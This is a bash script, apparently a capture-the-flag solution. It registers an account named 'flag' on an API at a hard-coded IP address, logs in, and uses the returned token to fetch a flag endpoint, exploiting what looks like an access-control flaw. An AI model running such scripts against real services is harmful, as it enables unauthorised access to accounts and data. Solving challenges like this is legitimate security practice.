#!/bin/bash

# Variables
REGISTER_URL="http://128.199.111.38:9101/v1/auth/register"
LOGIN_URL="http://128.199.111.38:9101/v1/auth/login"
FLAG_URL="http://128.199.111.38:9101/v1/users/flag"
EMAIL="attackes2@example.com"
PASSWORD="StrongPassword123!"
USERNAME="flag"

# Step 1: Register the user
echo "Registering user..."
REGISTER_RESPONSE=$(curl -s -X POST "$REGISTER_URL" \
     -H "Content-Type: application/json" \
     -d '{
           "name": "'"$USERNAME"'",
           "email": "'"$EMAIL"'",
           "password": "'"$PASSWORD"'"
         }')

echo "Register Response:"
echo "$REGISTER_RESPONSE"
echo ""

# Step 2: Login the user
echo "Logging in..."
LOGIN_RESPONSE=$(curl -s -X POST "$LOGIN_URL" \
     -H "Content-Type: application/json" \
     -d '{
           "email": "'"$EMAIL"'",
           "password": "'"$PASSWORD"'"
         }')

echo "Login Response:"
echo "$LOGIN_RESPONSE"
echo ""

# Extract the access token using jq
ACCESS_TOKEN=$(echo "$LOGIN_RESPONSE" | jq -r '.tokens.access.token')

if [ "$ACCESS_TOKEN" == "null" ] || [ -z "$ACCESS_TOKEN" ]; then
    echo "Failed to obtain access token."
    exit 1
fi

echo "Access Token: $ACCESS_TOKEN"
echo ""

# Step 3: Access the flag
echo "Accessing the flag..."
FLAG_RESPONSE=$(curl -s -X GET "$FLAG_URL" \
     -H "Authorization: Bearer $ACCESS_TOKEN" \
     -H "Content-Type: application/json")

echo "Flag Response:"
echo "$FLAG_RESPONSE"
echo ""
